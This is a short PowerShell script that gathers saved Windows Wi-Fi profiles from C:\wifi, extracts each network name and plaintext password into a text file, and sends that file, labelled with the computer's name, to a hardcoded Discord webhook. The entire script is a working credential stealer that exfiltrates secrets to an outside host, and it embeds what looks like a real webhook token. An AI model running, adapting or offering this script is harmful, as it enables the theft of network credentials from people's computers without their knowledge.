# Get all XML files in the specified directory
$xmlFiles = Get-ChildItem -Path "C:\wifi" -Filter *.xml

foreach ($file in $xmlFiles) {
    # Load the XML content
    [xml]$xmlContent = Get-Content -Path $file.FullName
    
    # Extract the <name> element and <keyMaterial>
    $name = $xmlContent.WLANProfile.name
    $password = $xmlContent.WLANProfile.MSM.security.sharedKey.keyMaterial
    #define the path for new txt file
    $outputFilePath= Join-Path -Path $file.DirectoryName -ChildPath "nameKey.txt"
    #append the <name> element ot the txt file
    Add-Content -Path $outputFilePath -value "Name=>$name","Password=>$password"
    
    # Print the <name> element to the console
    #Write-Output $name,$password
}
$webhookUrl="https://discord.com/api/webhooks/999369094853828770/Y_a4rtqQImD-h12-mf4Vgb1qun2oHfuQEsUay6PIaMidC1z7AxXiUJz4_hICnM8rHueJ"

# Define the path to the names.txt file
$namesFilePath = "C:\wifi\nameKey.txt"

# Read the content of the names.txt file
$namesContent = Get-Content -Path $namesFilePath -Raw


# Create the payload
$payload = @{
    content = "$env:COMPUTERNAME Wi-Fi Passwords`n$namesContent"
}

# Convert the payload to JSON
$jsonPayload = $payload | ConvertTo-Json

# Send the payload to the Discord webhook
try {
    $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonPayload -ContentType 'application/json'
    Write-Output "Names have been sent to the Discord webhook."
} catch {
    Write-Output "Error: $($_.Exception.Message)"
}


PAUSE
